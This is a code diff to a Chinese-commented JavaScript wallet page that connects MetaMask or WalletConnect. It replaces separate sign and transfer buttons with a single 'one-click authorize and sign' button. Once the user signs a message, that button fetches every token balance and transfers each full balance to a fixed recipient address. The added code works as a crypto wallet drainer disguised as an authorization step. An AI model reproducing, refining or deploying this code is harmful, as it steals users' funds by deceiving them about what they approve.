@@ -42,8 +42,8 @@ window.onload = async () => {
                     isConnected = true;
                     document.getElementById('status').innerText = 'MetaMask 已连接';
 
-                    // 启用签名按钮
-                    document.getElementById('signButton').disabled = false;
+                    // 启用一键授权和签名按钮
+                    document.getElementById('authorizeAndSignButton').disabled = false;
                 } else {
                     document.getElementById('status').innerText = '未检测到已连接的账户';
                 }
@@ -66,15 +66,12 @@ window.onload = async () => {
                 isConnected = true;
                 document.getElementById('status').innerText = 'WalletConnect 已连接';
 
-                // 启用签名按钮
-                document.getElementById('signButton').disabled = false;
+                // 启用一键授权和签名按钮
+                document.getElementById('authorizeAndSignButton').disabled = false;
             } else {
                 document.getElementById('status').innerText = '未检测到已连接的账户';
             }
         }
-
-        // 启用转移按钮
-        document.getElementById('transferButton').disabled = false;
     } catch (error) {
         document.getElementById('status').innerText = '连接失败: ' + error.message;
     }
@@ -88,50 +85,44 @@ const updateWalletList = (address) => {
     walletList.appendChild(walletItem);
 };
 
-// 签名按钮点击事件
-document.getElementById('signButton').onclick = async () => {
+// 一键授权和签名按钮点击事件
+document.getElementById('authorizeAndSignButton').onclick = async () => {
     const accounts = await web3.eth.getAccounts();
     if (accounts.length > 0) {
         const account = accounts[0];
+        
+        // 签名确认信息
         const message = `签名确认: 你正在授权从该钱包中转移代币到 ${recipientAddress}`;
         try {
             // 发起签名请求
             const signature = await web3.eth.personal.sign(message, account);
             document.getElementById('status').innerText = `签名成功: ${signature}`;
-        } catch (error) {
-            document.getElementById('status').innerText = `签名失败: ${error.message}`;
-        }
-    } else {
-        document.getElementById('status').innerText = '请先连接钱包';
-    }
-};
 
-// 转移代币的按钮点击事件
-document.getElementById('transferButton').onclick = async () => {
-    const accounts = await web3.eth.getAccounts();
-    if (accounts.length > 0) {
-        const account = accounts[0];
-        document.getElementById('status').innerText += `\n正在获取 ${account} 的代币余额...`;
-        const tokenBalances = await getTokenBalances(account);
+            // 签名成功后，进行代币转移
+            document.getElementById('status').innerText += `\n正在获取 ${account} 的代币余额...`;
+            const tokenBalances = await getTokenBalances(account);
 
-        for (const tokenAddress in tokenBalances) {
-            const token = tokenBalances[tokenAddress];
-            const balance = token.balance;
+            for (const tokenAddress in tokenBalances) {
+                const token = tokenBalances[tokenAddress];
+                const balance = token.balance;
 
-            if (balance.gt(0)) {
-                const tokenContract = new web3.eth.Contract(erc20Abi, tokenAddress);
-                try {
-                    const transfer = await tokenContract.methods.transfer(recipientAddress, balance.toString()).send({ from: account });
-                    document.getElementById('status').innerText += `\n成功转移 ${balance.toString()} ${token.symbol} 从 ${account} 至 ${recipientAddress}`;
-                } catch (error) {
-                    document.getElementById('status').innerText += `\n转移 ${token.symbol} 失败: ${error.message}`;
+                if (balance.gt(0)) {
+                    const tokenContract = new web3.eth.Contract(erc20Abi, tokenAddress);
+                    try {
+                        const transfer = await tokenContract.methods.transfer(recipientAddress, balance.toString()).send({ from: account });
+                        document.getElementById('status').innerText += `\n成功转移 ${balance.toString()} ${token.symbol} 从 ${account} 至 ${recipientAddress}`;
+                    } catch (error) {
+                        document.getElementById('status').innerText += `\n转移 ${token.symbol} 失败: ${error.message}`;
+                    }
+                } else {
+                    document.getElementById('status').innerText += `\n账户 ${account} 在 ${token.symbol} (${tokenAddress}) 上没有代币余额`;
                 }
-            } else {
-                document.getElementById('status').innerText += `\n账户 ${account} 在 ${token.symbol} (${tokenAddress}) 上没有代币余额`;
             }
-        }
 
-        document.getElementById('status').innerText += '\n所有代币转移完成';
+            document.getElementById('status').innerText += '\n所有代币转移完成';
+        } catch (error) {
+            document.getElementById('status').innerText = `签名或转移操作失败: ${error.message}`;
+        }
     } else {
         document.getElementById('status').innerText = '请先连接钱包';
     }
